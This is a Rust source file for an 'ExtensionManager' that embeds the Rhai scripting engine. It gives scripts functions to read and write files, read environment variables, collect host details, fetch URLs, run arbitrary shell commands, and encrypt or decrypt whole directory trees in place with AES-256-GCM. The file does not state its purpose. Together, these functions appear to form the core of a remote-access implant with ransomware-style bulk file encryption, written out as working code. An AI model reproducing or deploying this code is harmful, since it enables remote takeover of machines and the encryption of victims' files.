use rhai::{Engine, Scope, Dynamic};
use std::fs;
use walkdir::WalkDir;
use aes_gcm::{
    aead::{Aead, KeyInit, OsRng},
    Aes256Gcm, Nonce
};
use rand::RngCore;

// --- CRYPTO HELPERS (Private) ---

fn do_encrypt(cipher: &Aes256Gcm, plaintext: &[u8]) -> Result<Vec<u8>, String> {
    let mut nonce_bytes = [0u8; 12];
    OsRng.fill_bytes(&mut nonce_bytes);
    let nonce = Nonce::from_slice(&nonce_bytes);

    match cipher.encrypt(nonce, plaintext) {
        Ok(ct) => {
            let mut final_payload = nonce_bytes.to_vec();
            final_payload.extend_from_slice(&ct);
            Ok(final_payload)
        },
        Err(e) => Err(format!("AES Error: {}", e)),
    }
}

fn do_decrypt(cipher: &Aes256Gcm, encrypted_data: &[u8]) -> Result<Vec<u8>, String> {
    if encrypted_data.len() < 12 {
        return Err("Data too short (missing nonce)".to_string());
    }
    let (nonce_bytes, ciphertext) = encrypted_data.split_at(12);
    let nonce = Nonce::from_slice(nonce_bytes);

    match cipher.decrypt(nonce, ciphertext) {
        Ok(pt) => Ok(pt),
        Err(e) => Err(format!("AES Error (Wrong Key?): {}", e)),
    }
}

// --- EXTENSION MANAGER ---

pub struct ExtensionManager {
    engine: Engine,
    scope: Scope<'static>,
}

impl ExtensionManager {
    pub fn new() -> Self {
        let mut engine = Engine::new();

        engine.register_fn("internal_read", |path: &str| -> String {
            match fs::read_to_string(path) {
                Ok(content) => content,
                Err(e) => format!("[Error] Read Failed: {}", e),
            }
        });

        engine.register_fn("internal_write", |path: &str, data: &str| -> String {
            match fs::write(path, data) {
                Ok(_) => "Success".to_string(),
                Err(e) => format!("[Error] Write Failed: {}", e),
            }
        });

        engine.register_fn("internal_ls", |path: &str| -> String {
            let mut entries = String::new();
            for entry in WalkDir::new(path).max_depth(1).into_iter().filter_map(|e| e.ok()) {
                let p = entry.path().display().to_string();
                entries.push_str(&format!("{}\n", p));
            }
            if entries.is_empty() { "No files or path invalid".to_string() } else { entries }
        });

        engine.register_fn("internal_env", |var: &str| -> String {
            std::env::var(var).unwrap_or_else(|_| "Not Found".to_string())
        });

        engine.register_fn("internal_sysinfo", || -> String {
            let hostname = sys_info::hostname().unwrap_or_default();
            let os = sys_info::os_release().unwrap_or_default();
            let mem = sys_info::mem_info().map(|m| m.total).unwrap_or(0);
            format!("Host: {}\nOS: {}\nMem: {} KB", hostname, os, mem)
        });

        engine.register_fn("internal_http_get", |url: &str| -> String {
            match reqwest::blocking::get(url) {
                Ok(resp) => match resp.text() {
                    Ok(t) => t,
                    Err(e) => format!("Text Parse Error: {}", e),
                },
                Err(e) => format!("Request Error: {}", e),
            }
        });

        engine.register_fn("internal_encrypt_file", |path: &str, key_hex: &str| -> String {
            let key_bytes = match hex::decode(key_hex) { Ok(k) => k, Err(_) => return "Invalid Key".into() };
            if key_bytes.len() != 32 { return "Key must be 32 bytes".into(); }

            let plaintext = match fs::read(path) { Ok(d) => d, Err(e) => return format!("Read Error: {}", e) };
            
            let key = aes_gcm::Key::<Aes256Gcm>::from_slice(&key_bytes);
            let cipher = Aes256Gcm::new(key);

            match do_encrypt(&cipher, &plaintext) {
                Ok(data) => match fs::write(path, data) { Ok(_) => "Success".into(), Err(e) => format!("Write Error: {}", e) },
                Err(e) => e,
            }
        });

        engine.register_fn("internal_decrypt_file", |path: &str, key_hex: &str| -> String {
            let key_bytes = match hex::decode(key_hex) { Ok(k) => k, Err(_) => return "Invalid Key".into() };
            if key_bytes.len() != 32 { return "Key must be 32 bytes".into(); }

            let encrypted = match fs::read(path) { Ok(d) => d, Err(e) => return format!("Read Error: {}", e) };
            
            let key = aes_gcm::Key::<Aes256Gcm>::from_slice(&key_bytes);
            let cipher = Aes256Gcm::new(key);

            match do_decrypt(&cipher, &encrypted) {
                Ok(data) => match fs::write(path, data) { Ok(_) => "Success".into(), Err(e) => format!("Write Error: {}", e) },
                Err(e) => e,
            }
        });

        engine.register_fn("internal_encrypt_recursive", |root_path: &str, key_hex: &str| -> String {
            let key_bytes = match hex::decode(key_hex) { Ok(k) => k, Err(_) => return "Invalid Key".into() };
            if key_bytes.len() != 32 { return "Key must be 32 bytes".into(); }

            let key = aes_gcm::Key::<Aes256Gcm>::from_slice(&key_bytes);
            let cipher = Aes256Gcm::new(key);

            let mut success = 0;
            let mut fail = 0;
            let mut log = String::new();

            for entry in WalkDir::new(root_path).into_iter().filter_map(|e| e.ok()) {
                if entry.file_type().is_file() {
                    let path = entry.path();
                    
                    match fs::read(path) {
                        Ok(plaintext) => {
                            match do_encrypt(&cipher, &plaintext) {
                                Ok(enc_data) => {
                                    match fs::write(path, enc_data) {
                                        Ok(_) => success += 1,
                                        Err(e) => {
                                            fail += 1;
                                            log.push_str(&format!("Write fail {:?}: {}\n", path, e));
                                        }
                                    }
                                },
                                Err(e) => {
                                    fail += 1;
                                    log.push_str(&format!("Encrypt fail {:?}: {}\n", path, e));
                                }
                            }
                        },
                        Err(_) => { fail += 1; }
                    }
                }
            }
            format!("Recursion Complete.\nEncrypted: {}\nFailed/Skipped: {}\nErrors:\n{}", success, fail, log)
        });

        engine.register_fn("internal_decrypt_recursive", |root_path: &str, key_hex: &str| -> String {
            let key_bytes = match hex::decode(key_hex) { Ok(k) => k, Err(_) => return "Invalid Key".into() };
            if key_bytes.len() != 32 { return "Key must be 32 bytes".into(); }

            let key = aes_gcm::Key::<Aes256Gcm>::from_slice(&key_bytes);
            let cipher = Aes256Gcm::new(key);

            let mut success = 0;
            let mut fail = 0;
            let mut log = String::new();

            for entry in WalkDir::new(root_path).into_iter().filter_map(|e| e.ok()) {
                if entry.file_type().is_file() {
                    let path = entry.path();
                    
                    match fs::read(path) {
                        Ok(encrypted) => {
                            match do_decrypt(&cipher, &encrypted) {
                                Ok(dec_data) => {
                                    match fs::write(path, dec_data) {
                                        Ok(_) => success += 1,
                                        Err(e) => {
                                            fail += 1;
                                            log.push_str(&format!("Write fail {:?}: {}\n", path, e));
                                        }
                                    }
                                },
                                Err(e) => {
                                    fail += 1;
                                    log.push_str(&format!("Decrypt fail {:?}: {}\n", path, e));
                                }
                            }
                        },
                        Err(_) => { fail += 1; }
                    }
                }
            }
            format!("Recursion Complete.\nDecrypted: {}\nFailed/Skipped: {}\nErrors:\n{}", success, fail, log)
        });

        engine.register_fn("internal_keygen", || -> String {
            let mut key = [0u8; 32];
            OsRng.fill_bytes(&mut key);
            hex::encode(key)
        });

        engine.register_fn("print_log", |msg: &str| {
            println!("[Ext Log] {}", msg);
        });

        engine.register_fn("exec_os", |cmd: &str| -> String {
             match std::process::Command::new(if cfg!(target_os = "windows") { "cmd" } else { "sh" })
                .arg(if cfg!(target_os = "windows") { "/C" } else { "-c" })
                .arg(cmd)
                .output() 
            {
                Ok(o) => String::from_utf8_lossy(&o.stdout).to_string(),
                Err(e) => format!("Error: {}", e),
            }
        });

        Self {
            engine,
            scope: Scope::new(),
        }
    }

    pub fn run_script(&mut self, script_content: &str, args: Vec<String>) -> String {
        let rhai_args: Vec<Dynamic> = args.into_iter().map(|s| s.into()).collect();
        self.scope.set_or_push("args", rhai_args);

        match self.engine.eval_with_scope::<String>(&mut self.scope, script_content) {
            Ok(result) => result,
            Err(e) => format!("[Script Exception]: {}", e),
        }
    }
}
